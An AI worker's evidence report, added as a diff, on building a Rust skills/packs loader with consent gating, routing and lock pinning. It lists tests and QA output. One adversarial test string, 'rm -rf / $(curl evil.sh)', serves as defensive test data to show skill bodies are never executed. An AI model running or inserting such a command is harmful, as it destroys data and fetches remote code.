@@ -1,0 +1,224 @@
+= TASK 30 - rust-agent-harness: skills/packs system (harness-skills) ========
+Worker: todo-30 implementation worker (Sisyphus-junior), 2026-09-12
+Base: HEAD 62b32bf confirmed at start (task-specified). Main advanced to
+cc44136 during the task (parallel harness-exec worker; zero overlap with
+harness-skills — `git show --stat cc44136` touches harness-exec only).
+Commit: feat(skills): compatible pack system
+
+TDD RED RUN (tests authored first, run against committed HEAD)
+-----------------------------------------------------------------------
+All 5 test binaries (corpus_acceptance, loader_routing[1], rules_precedence,
+packs_lock_watch, skill_format) were written BEFORE any implementation,
+then executed in an ISOLATED DETACHED WORKTREE of HEAD 62b32bf
+(C:\ct-t30red, dedicated CARGO_TARGET_DIR=C:\ct-t30-target):
+  cmd: cargo test -p harness-skills        (worktree C:\ct-t30red)
+  result (summary of compile errors — the RED state):
+    error[E0432]: unresolved import `harness_skills::loader`        (x3)
+    error[E0432]: unresolved import `harness_skills::consent`
+    error[E0432]: unresolved import `harness_skills::routing`
+    error[E0432]: unresolved import `harness_skills::skill`
+    error[E0432]: unresolved import `harness_skills::pack`
+    error[E0432]: unresolved import `harness_skills::watch`
+    error[E0432]: unresolved import `harness_skills::migrate`
+    error[E0432]: unresolved import `harness_skills::rules`
+    error[E0433]: cannot find `skill`/`loader`/`watch`/`migrate` in harness_skills (x18)
+    error: could not compile `harness-skills` (all 5 test binaries)
+  => 41 tests RED for the right reason (missing API, not test bugs).
+  [1] loader_routing.rs was later split into loader_vendor.rs +
+  consent_lock_extra.rs for the 250-LOC file ceiling.
+
+ACCEPTANCE FIXTURE (the user's REAL skills dirs, read-only copy)
+-----------------------------------------------------------------------
+Sources copied byte-exact with robocopy into
+harness-skills/tests/fixtures/corpus/{opencode,agents}
+(__pycache__/*.pyc excluded; 296 files, ~3.5 MB):
+  C:\Users\vsbb1\.config\opencode\skills\  -> 50 dirs = 49 skill dirs + _shared
+  C:\Users\vsbb1\.agents\skills\           -> 7 dirs
+Corpus inventory (documented, both real dirs are BELOW 60 skills so
+"copy all" applies): 56 top-level skill dirs; `microsoft-foundry` is a
+NESTED tree carrying 6 SKILL.md files (root + finetuning +
+models/deploy-model + capacity/customize/preset), so the corpus holds
+61 loadable SKILL.md entries = "60+" satisfied with all entries real.
+Real-world quirks the corpus exercises:
+  - 7 engineering skills (bim-authoring, civil-, electrical-, structural-,
+    thermal-engineering, itu-fiber-validator, engineering-compliance) have
+    NO frontmatter at all -> name derived from dir, description from first
+    heading, typed MissingFrontmatter warning (opencode-style compat).
+  - lgpd-data-privacy contains an INVALID UTF-8 byte (corrupted source) ->
+    lossy replacement + typed InvalidUtf8 warning.
+  - ui-ux-accessibility declares a description LONGER than the
+    agentskills.io 1024 cap -> typed DescriptionTruncated warning + the
+    surface truncated to 1024 (compat-swallow; name-length violations stay
+    hard errors because names are identifiers).
+  - 14 skills declare `metadata:` nested maps with flow-sequence values
+    (e.g. frameworks: [".NET 8+", "Redis"]) and license keys.
+
+DELIVERED (harness-skills only; ZERO new external dependencies)
+-----------------------------------------------------------------------
+src/ (16 modules, each <=250 pure LOC; no unwrap/expect/panic in src;
+deny(missing_docs) honored):
+  skill.rs      types: SkillName (validated kebab), SkillMeta (metadata
+               surface ONLY — no body field exists, progressive
+               disclosure is structural), ModelGuidance, typed
+               SkillParseError{path,line,kind} + SkillWarning taxonomies,
+               tool_pattern_matches (`*` wildcard for allowed-tools).
+  frontmatter.rs hand-rolled YAML-subset scanner (scalars, quoted,
+               folded >- / literal |, flow seqs, block seqs, one-level
+               nested maps). JUSTIFICATION for no serde_yaml: archived
+               crate + new-dep discipline; corpus only uses this subset.
+  parse.rs      parse_skill_document: frontmatter extraction, agentskills
+               validation (name kebab <=64, description <=1024),
+               extensions (triggers incl. non-English, do-not-trigger-on,
+               languages, version, allowed-tools, model-guidance per-model
+               map, context_fork bool), unknown keys -> sorted typed
+               warnings (forward-compatible), invalid UTF-8 -> lossy +
+               warning, bare markdown -> derived + warning.
+  triggers.rs   USE FOR / DO NOT USE FOR description-segment derivation +
+               the /name command trigger.
+  routing.rs    lexical router: phrase containment (case-insensitive;
+               word-boundary for single ASCII words; plain containment for
+               CJK/emoji), negative scoping WINS over positive matches,
+               subtree scope filtering (component-wise, case-insensitive),
+               weak >=2-name-words match, consent-pending partition.
+  loader.rs     5-vendor scan (.harness > .opencode > .claude > .agents >
+               .cursor), vendor_root(base) + explicit skills_dir(dir,
+               vendor) mounts, LockMode::Off/Record.
+  scan.rs       recursive SKILL.md discovery (nested skill trees like
+               microsoft-foundry), _shared partial pickup, nested
+               monorepo vendor dirs -> subtree scopes, cross-vendor
+               dedup-by-name with ShadowRecords (sorted ascending
+               precedence). Malformed SKILL.md -> typed parse error in the
+               report; the scan NEVER aborts.
+  index.rs      SkillIndex: metas()/meta()/metas_json() (no bodies),
+               invoke() loads body+allowed_tools+model_guidance+resolved
+               partials from disk on demand, route_text/route_with,
+               apply_lock (pins recorded on first sight; mismatch pins are
+               NEVER rewritten; mismatched skills shadowed out of routing).
+  lock.rs       skills-lock.json (blake3 content pins, atomic tmp+rename
+               write, sorted-key stable).
+  consent.rs    ConsentGate + install_warning generated FROM declared
+               tools + triggers (never from bodies); ConsentRecord; skills
+               inert until granted.
+  rules.rs      AGENTS.md + CLAUDE.md + .claude/rules + .cursor/rules +
+               .harness/rules (User layer) pickup, nearest-first stacking,
+               child-wins-on-conflict within a layer (both retained),
+               AGENTS.md beats CLAUDE.md at the same dir, TEAM: inline
+               marker = enforceable team floor, typed RulesConflict
+               report when a lower layer attempts an override.
+  trust.rs      typed TrustConfig (subtree allow + explicit-deny carve-outs
+               that win over allow); untrusted dirs skipped with a typed
+               notice.
+  migrate.rs    CLAUDE.md -> AGENTS.md one-time COPY (marker header, never
+               moves/deletes the source, idempotent via AGENTS.md
+               existence), first_init creates .harness/{skills,rules},
+               /migrate-to-skills-style converters (legacy rules ->
+               rule-* skills; .claude/commands slash-commands -> skills
+               with /name triggers, bodies verbatim) with typed
+               ConversionReport + lossy flags.
+  pack.rs       {{shared:name}} partial interpolation (missing partial =
+               typed error), findings-schema (typed JSON-schema-ish:
+               required/optional, string/number/boolean/array types,
+               enums; unknown output fields allowed) +
+               validate_findings returning ALL violations.
+  watch.rs      SkillWatcher trait (the seam), PollingWatcher zero-dep
+               content-hash fallback, DebounceConfig for the daemon's
+               future notify+debouncer impl (documented seam).
+  error.rs/lib.rs typed SkillError (non_exhaustive) + crate docs.
+Cargo.toml: serde/serde_json/thiserror/blake3 (all pre-existing workspace
+deps) + tempfile dev-dep. NO harness-core dependency — the binding's glob
+question resolved by reimplementing the ~15-line `*` wildcard matcher in
+skill.rs because (a) core is under active todo-13 compaction by a parallel
+worker and (b) only allowed-tools patterns need wildcards. Cargo.lock diff
+= +7 lines of mechanical dependency registration, zero new crates.
+
+TESTS: 6 integration files, 41 tests, all green. Exact cmd:
+  cargo test -p harness-skills
+  -> 8 binaries: 0+7+5+5+7+9+8+0 passed / 0 failed
+  cargo clippy -p harness-skills --all-targets  -> 0 errors (workspace
+  lints: rust warnings=deny, clippy all=deny). cargo fmt applied.
+
+QA CHANNELS (generated by a since-deleted evidence_dump example run)
+-----------------------------------------------------------------------
+HAPPY — fixture corpus load + progressive disclosure + routing matrix
+(pasted verbatim):
+  == CORPUS LOAD ==
+  parsed: 61
+  parse_errors: 0
+  shadows (corpus): 0
+  warnings: missing-frontmatter=7, invalid-utf8=1, desc-truncated=1
+  == PROGRESSIVE DISCLOSURE (audit-security) ==
+  metadata surface: {"description":"Security auditing: injection vulnerabilities, exposed secret","languages":[".NET/C#","Python","JavaScript","Go","Java","Rust"],"name":"audit-security","triggers":["/audit-security"],"version":"2.0.0"}
+  invoked body head: # Security Audit Squad /  / ## USE FOR /  / - Input validation — unsanitized user input, missing
+  body leaks into metas_json: false
+  == ROUTING MATRIX SAMPLE ==
+  "audit security of my Flask app: injection and secrets" -> ["audit-security"]
+  "help me set up Keycloak OIDC login" -> ["keycloak-oidc"]
+  "nightly cleanup jobs and recurring jobs" -> ["quartz-scheduling"]
+  "please run /caveman" -> ["caveman"]
+  "what database should I use for analytics" -> []
+  == VENDOR DEDUP SHADOWS (synthetic) ==
+  parsed after dedup: 1
+  shadow: dupe in .cursor
+  shadow: dupe in .agents
+  shadow: dupe in .claude
+  shadow: dupe in .opencode
+  winner vendor: Harness
+  == INSTALL WARNING (consent, inert until granted) ==
+  INSTALL WARNING for skill 'consented-tool': once active it can use these tools: [Bash, Write], and it activates automatically when your prompt matches its triggers (deploy everything). Review both lists before enabling; decline to keep the skill inert.
+  routable before consent: false (pending: [SkillName("consented-tool")])
+  routable after consent: true
+  == CLAUDE.MD -> AGENTS.MD MIGRATION ==
+  created: Some("AGENTS.md")
+  marker present: true
+  CLAUDE.md still exists: true
+  second run created: None (Some(AgentsAlreadyExists))
+
+FAILURE — DO-NOT-USE respected, malformed typed error, team floor (pasted):
+  == NEGATIVE SCOPE (lgpd-data-privacy, REAL corpus skill) ==
+  BLOCKED lgpd-data-privacy by ["frontend UI work"] (positive hits: ["consent management"])
+  == MALFORMED SKILL.MD (typed error) ==
+  C:\...\Temp\.tmpyzXSSd\.opencode\skills\broken\SKILL.md:4: unterminated frontmatter
+  (scan continues; entries after the malformed one still load — proven by
+   malformed_skill_is_recorded_and_scan_continues)
+  == TEAM FLOOR CONFLICT ==
+  id=secrets winner=Team offending=User team_floor=true text="user says pasting secrets is fine sometimes."
+
+ADVERSARIAL COVERAGE (all as tests, green)
+-----------------------------------------------------------------------
+malformed: frontmatter garbage (NotAMapping), unterminated, duplicate
+  keys, invalid name shape, name over 64 (skill_format.rs)
+new input parsing: non-English triggers incl. CJK (安全审计 /
+  セキュリティ監査 / 보안 감사), emoji (🔒 security), unicode dir names
+  (навык-セキュリティ), unicode subtree scoping, >260-char paths via \\?\
+  canonicalization (consent_lock_extra.rs / loader_vendor.rs)
+stale_state: lock-file mismatch -> typed LockMismatch + skill shadowed
+  out of routing while still listed; hot-reload PollingWatcher
+  detects add/change/remove + stable-state no-op (packs_lock_watch.rs)
+untrusted text: skill bodies are DATA — "rm -rf / $(curl evil.sh)" body
+  returned verbatim as a string, never executed; metas_json surface
+  provably free of body text (bodies-not-in-metadata asserted)
+flaky x3: full suite run 3x — identical results each run (also
+  flake_guard_repeated_loads_are_deterministic pins 3x identical
+  parsed-count + routing signature)
+misleading_success: assertions pin parsed FIELDS (name/version/languages/
+  triggers), routing DECISIONS (matched/blocked/scope_filtered/
+  pending_consent), and bodies-not-in-metadata via serialization
+hung: N/A (no waits, watchers are pull-based; suite ~0.15s total)
+dirty_worktree: repo carries parallel workers' in-flight .omo edits —
+  untouched; RED proof ran in a detached worktree of committed HEAD
+  62b32bf; this commit stages harness-skills/** + Cargo.lock +
+  this evidence file ONLY.
+
+RESIDUAL RISKS / DISCLOSURES
+-----------------------------------------------------------------------
+- The lexical router is deliberately conservative: prompts that only
+  semi-match a description (e.g. "convert a PDF to markdown" without a
+  full USE-FOR phrase) do not route; an LLM-side router later can use the
+  same metadata surface. Documented in routing.rs.
+- Description-over-cap is tolerated (truncated + warning) for compat;
+  name-over-cap stays a hard error. Both documented in skill.rs.
+- harness-core NOT depended on (glob reimplemented minimally) — revisit
+  after todo 13 lands if richer globs are ever needed in allowed-tools.
+- LockMode::Record auto-pins first-seen skills at {root}/.harness/
+  skills-lock.json; mismatched pins require an explicit human re-record
+  (never auto-rewritten).
